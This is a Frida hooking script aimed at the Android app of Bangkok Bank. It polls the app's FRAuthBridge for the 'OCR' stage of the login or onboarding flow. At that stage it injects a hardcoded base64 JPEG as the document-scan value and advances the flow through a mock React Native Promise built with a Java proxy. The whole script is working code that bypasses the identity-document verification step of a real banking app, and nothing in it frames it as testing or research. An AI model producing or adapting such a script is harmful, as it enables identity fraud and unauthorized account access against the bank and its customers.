// Frida OCR Injection via FRAuthBridge.next()
// Sprint 2.37 — Uses the app's own bridge method
//
// FRAuthBridge.next(String callbackValues, Promise promise)
// This is the PUBLIC method React Native calls to advance the flow.
// It handles: currentNode → fill callbacks → Node.next() → listener → UI update

Java.perform(function () {
    console.log("[BR] === FRAuthBridge.next() Direct Injection ===");

    var B64_IMAGE = "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";

    var injected = false;
    var pollCount = 0;

    var pollInterval = setInterval(function () {
        pollCount++;
        if (injected) { clearInterval(pollInterval); return; }

        Java.perform(function () {
            // Find FRAuthBridge instance
            Java.choose("com.bangkokbank.blue.ping.FRAuthBridge", {
                onMatch: function (bridge) {
                    if (injected) return;
                    try {
                        // Check current node stage
                        var FRB = Java.use("com.bangkokbank.blue.ping.FRAuthBridge");
                        var currentNode = null;
                        try {
                            currentNode = FRB.access$getCurrentNode$p(bridge);
                        } catch (e) {
                            console.log("[BR] getCurrentNode error: " + e);
                        }

                        if (!currentNode) {
                            if (pollCount <= 2) console.log("[BR] No currentNode yet (poll #" + pollCount + ")");
                            return;
                        }

                        var stage = currentNode.getStage();
                        if (stage !== "OCR") {
                            if (pollCount <= 2) console.log("[BR] Stage: " + stage + " (not OCR)");
                            return;
                        }

                        injected = true;
                        clearInterval(pollInterval);
                        console.log("[BR] *** OCR stage confirmed ***");

                        // Build callback values JSON
                        var callbackValues = JSON.stringify({
                            IDToken1: "0",
                            IDToken2: B64_IMAGE
                        });
                        console.log("[BR] Callback values length: " + callbackValues.length);

                        // Create a mock Promise (required @NonNull parameter)
                        var mockPromise = null;
                        try {
                            var PromiseCls = Java.use("com.facebook.react.bridge.Promise");
                            var classLoader = PromiseCls.class.getClassLoader();
                            var Proxy = Java.use("java.lang.reflect.Proxy");
                            var InvocationHandler = Java.use("java.lang.reflect.InvocationHandler");

                            var PromiseHandler = Java.registerClass({
                                name: "com.frida.PromiseHandler",
                                implements: [InvocationHandler],
                                methods: {
                                    invoke: function (proxy, method, args) {
                                        var mname = method.getName();
                                        console.log("[PROMISE] " + mname + " (args: " + (args ? args.length : 0) + ")");
                                        if (mname === "resolve") {
                                            console.log("[PROMISE] *** RESOLVED! ***");
                                            if (args) {
                                                for (var i = 0; i < args.length; i++) {
                                                    if (args[i]) console.log("[PROMISE]   arg" + i + ": " + args[i].toString().substring(0, 200));
                                                }
                                            }
                                        }
                                        if (mname === "reject") {
                                            console.log("[PROMISE] *** REJECTED ***");
                                            if (args) {
                                                for (var i = 0; i < args.length; i++) {
                                                    if (args[i]) console.log("[PROMISE]   arg" + i + ": " + args[i].toString().substring(0, 200));
                                                }
                                            }
                                        }
                                        return null;
                                    }
                                }
                            });
                            var ph = PromiseHandler.$new();
                            var classArray = Java.array("java.lang.Class", [PromiseCls.class]);
                            mockPromise = Proxy.newProxyInstance(classLoader, classArray, ph);
                            console.log("[BR] Mock Promise created");
                        } catch (e) {
                            console.log("[BR] Promise creation error: " + e);
                        }

                        // Call bridge.next(callbackValues, mockPromise)
                        console.log("[BR] *** Calling FRAuthBridge.next() ***");
                        try {
                            bridge.next(callbackValues, mockPromise);
                            console.log("[BR] *** FRAuthBridge.next() COMPLETED ***");
                        } catch (e) {
                            console.log("[BR] next() error: " + e);
                        }

                    } catch (e) {
                        console.log("[BR] Error: " + e);
                    }
                },
                onComplete: function () {}
            });
        });

        if (pollCount > 36) { clearInterval(pollInterval); console.log("[BR] Timeout"); }
    }, 5000);

    console.log("[BR] Polling started");
});
